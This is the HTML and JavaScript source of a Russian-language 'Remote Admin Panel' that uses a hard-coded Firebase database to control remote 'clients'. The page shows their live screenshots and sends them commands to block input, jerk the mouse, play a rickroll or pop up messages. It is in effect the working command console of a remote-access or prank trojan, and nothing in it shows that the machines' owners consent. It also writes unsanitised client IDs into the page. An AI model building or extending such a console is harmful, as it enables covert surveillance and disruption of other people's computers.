<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Admin Panel</title>
    <!-- Bootstrap 5 + иконки -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
    <style>
        body { background-color: #0a0a0a; color: #ccc; font-family: 'Courier New', monospace; }
        .sidebar { background: #1a1a1a; min-width: 250px; padding: 1rem; border-right: 1px solid #333; height: 100vh; overflow-y: auto; }
        .client-item {
            display: flex; align-items: center; padding: 8px 12px; margin: 4px 0;
            background: #222; border-radius: 6px; cursor: pointer; transition: 0.2s;
        }
        .client-item:hover { background: #2a2a2a; }
        .client-item.active { background: #0b5ed7; color: white; }
        .status-dot { width: 12px; height: 12px; border-radius: 50%; margin-right: 8px; }
        .online { background: #00e676; box-shadow: 0 0 8px #00e676; }
        .offline { background: #ff1744; box-shadow: 0 0 8px #ff1744; }
        .screen-img { max-width: 100%; border: 2px solid #333; border-radius: 8px; }
        .log-area { height: 150px; overflow-y: auto; background: #111; color: #0f0; padding: 8px; border: 1px solid #333; }
    </style>
</head>
<body>
    <div class="d-flex">
        <!-- Боковая панель со списком клиентов -->
        <div class="sidebar">
            <h4 class="text-success"><i class="bi bi-pc-display"></i> Clients</h4>
            <div id="clientList"></div>
            <div class="mt-2 small text-secondary" id="connectionStatus"></div>
        </div>

        <!-- Основная панель управления -->
        <div class="flex-grow-1 p-3">
            <div id="mainContent">
                <div class="text-center text-secondary mt-5">
                    <i class="bi bi-arrow-left-circle" style="font-size: 3rem;"></i>
                    <h4>Выберите клиента из списка</h4>
                </div>
            </div>
        </div>
    </div>

    <!-- Firebase SDK (модульный) -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getDatabase, ref, onValue, off, set, update } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

        // Конфигурация
        const firebaseConfig = {
            apiKey: "AIzaSyAAb2d_IOCpDO_niqfkjfWddhpZo0yaDOM",
            authDomain: "gen-lang-client-0884792103.firebaseapp.com",
            databaseURL: "https://gen-lang-client-0884792103-default-rtdb.europe-west1.firebasedatabase.app",
            projectId: "gen-lang-client-0884792103",
            storageBucket: "gen-lang-client-0884792103.firebasestorage.app",
            messagingSenderId: "556057210756",
            appId: "1:556057210756:web:45677d6e28066be811f7d1"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Глобальное состояние
        let currentClientId = null;
        let screenUnsubscribe = null;
        let clientsData = {};   // clientId -> { last_seen, ... }
        let clientElements = {}; // clientId -> DOM элемент

        // Подключение к списку клиентов
        const clientsRef = ref(db, 'clients');
        onValue(clientsRef, (snapshot) => {
            const data = snapshot.val();
            const listDiv = document.getElementById('clientList');
            listDiv.innerHTML = '';

            if (!data) {
                listDiv.innerHTML = '<div class="text-muted">Нет подключённых клиентов</div>';
                clientsData = {};
                return;
            }

            Object.keys(data).forEach(clientId => {
                const clientInfo = data[clientId] || {};
                clientsData[clientId] = {
                    last_seen: clientInfo.last_seen || 0,
                    status: clientInfo.status || 'offline'
                };

                // Создаём элемент списка
                const item = document.createElement('div');
                item.className = 'client-item';
                item.dataset.clientId = clientId;
                item.innerHTML = `
                    <span class="status-dot" id="dot-${clientId}"></span>
                    <span>${clientId}</span>
                `;
                item.addEventListener('click', () => selectClient(clientId));
                listDiv.appendChild(item);
                clientElements[clientId] = item;

                // Первичное обновление статуса
                updateClientStatus(clientId);
            });
        });

        // Обновление статуса (каждую секунду)
        function updateAllStatuses() {
            Object.keys(clientsData).forEach(updateClientStatus);
        }

        function updateClientStatus(clientId) {
            const dot = document.getElementById(`dot-${clientId}`);
            if (!dot) return;
            const lastSeen = clientsData[clientId]?.last_seen;
            const now = Date.now();
            const isOnline = lastSeen && (now - lastSeen < 10000); // 10 секунд
            dot.className = `status-dot ${isOnline ? 'online' : 'offline'}`;
        }

        setInterval(updateAllStatuses, 1000);

        // Мониторинг last_seen для каждого клиента (чтобы данные обновлялись)
        // Уже получаем через onValue клиентов, но last_seen вложен, поэтому при изменении last_seen обновляем clientsData
        // Для этого повесим дополнительный слушатель на каждого клиента при необходимости.
        // Но проще: внутри onValue мы уже берем последние данные, а last_seen обновляется раз в 5 сек,
        // так что секундного опроса достаточно.

        // Выбор клиента
        function selectClient(clientId) {
            // Снимаем выделение с предыдущего
            if (currentClientId && clientElements[currentClientId]) {
                clientElements[currentClientId].classList.remove('active');
            }
            currentClientId = clientId;
            if (clientElements[clientId]) {
                clientElements[clientId].classList.add('active');
            }

            // Отключаем предыдущий слушатель скриншота
            if (screenUnsubscribe) {
                screenUnsubscribe();
                screenUnsubscribe = null;
            }

            // Рендерим панель управления
            renderControlPanel(clientId);

            // Подписываемся на скриншот
            const screenRef = ref(db, `clients/${clientId}/screenshot`);
            screenUnsubscribe = onValue(screenRef, (snap) => {
                const base64 = snap.val();
                const img = document.getElementById('screenshotImg');
                if (img) {
                    if (base64) {
                        img.src = `data:image/jpeg;base64,${base64}`;
                    } else {
                        img.src = ''; // placeholder
                    }
                }
            });
        }

        function renderControlPanel(clientId) {
            const main = document.getElementById('mainContent');
            main.innerHTML = `
                <h3><i class="bi bi-sliders"></i> Управление: <span class="text-info">${clientId}</span></h3>
                <div class="row mt-3">
                    <!-- Скриншот -->
                    <div class="col-md-8">
                        <div class="card bg-dark border-secondary">
                            <div class="card-header">Скриншот</div>
                            <div class="card-body text-center">
                                <img id="screenshotImg" class="screen-img" src="" alt="Нет данных" style="max-height: 400px;">
                            </div>
                        </div>
                    </div>
                    <!-- Логи -->
                    <div class="col-md-4">
                        <div class="card bg-dark border-secondary">
                            <div class="card-header">Лог действий</div>
                            <div class="card-body">
                                <div id="logArea" class="log-area"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- Кнопки команд -->
                <div class="mt-3">
                    <h5>Команды</h5>
                    <div class="d-flex flex-wrap gap-2">
                        <button class="btn btn-outline-warning" onclick="sendCommand('rickroll')"><i class="bi bi-music-note"></i> Rickroll</button>
                        <button class="btn btn-outline-warning" onclick="sendCommand('crazy_mouse')"><i class="bi bi-mouse"></i> Crazy Mouse</button>
                        <button class="btn btn-outline-danger" onclick="sendCommand('block_input')"><i class="bi bi-lock"></i> Block Input</button>
                        <button class="btn btn-outline-info" onclick="sendCommand('screenshot')"><i class="bi bi-camera"></i> Screenshot</button>
                    </div>
                    <div class="input-group mt-3">
                        <input type="text" id="msgText" class="form-control" placeholder="Текст сообщения...">
                        <button class="btn btn-outline-success" onclick="sendMessage()"><i class="bi bi-send"></i> Отправить msg</button>
                    </div>
                </div>
            `;
            addLog(`Подключились к ${clientId}`);
        }

        // Функция лога
        function addLog(message) {
            const logArea = document.getElementById('logArea');
            if (!logArea) return;
            const time = new Date().toLocaleTimeString();
            logArea.innerHTML += `[${time}] ${message}\n`;
            logArea.scrollTop = logArea.scrollHeight;
        }

        // Отправка команд
        window.sendCommand = function(cmd) {
            if (!currentClientId) return alert('Клиент не выбран!');
            set(ref(db, `clients/${currentClientId}/command`), cmd)
                .then(() => addLog(`Отправлена команда: ${cmd}`))
                .catch(err => {
                    addLog(`Ошибка отправки: ${err.message}`);
                });
        };

        window.sendMessage = function() {
            if (!currentClientId) return alert('Клиент не выбран!');
            const textInput = document.getElementById('msgText');
            const text = textInput.value.trim();
            if (!text) return;
            // Обновляем payload и команду msg
            const updates = {};
            updates[`clients/${currentClientId}/payload`] = text;
            updates[`clients/${currentClientId}/command`] = 'msg';
            update(ref(db), updates)
                .then(() => {
                    addLog(`Отправлено сообщение: "${text}"`);
                    textInput.value = '';
                })
                .catch(err => addLog(`Ошибка: ${err.message}`));
        };

        // Статус соединения с Firebase
        const connectedRef = ref(db, '.info/connected');
        onValue(connectedRef, (snap) => {
            const el = document.getElementById('connectionStatus');
            if (snap.val() === true) {
                el.innerHTML = '<i class="bi bi-wifi"></i> Connected';
                el.style.color = '#00e676';
            } else {
                el.innerHTML = '<i class="bi bi-wifi-off"></i> Disconnected';
                el.style.color = '#ff1744';
            }
        });
    </script>
</body>
</html>
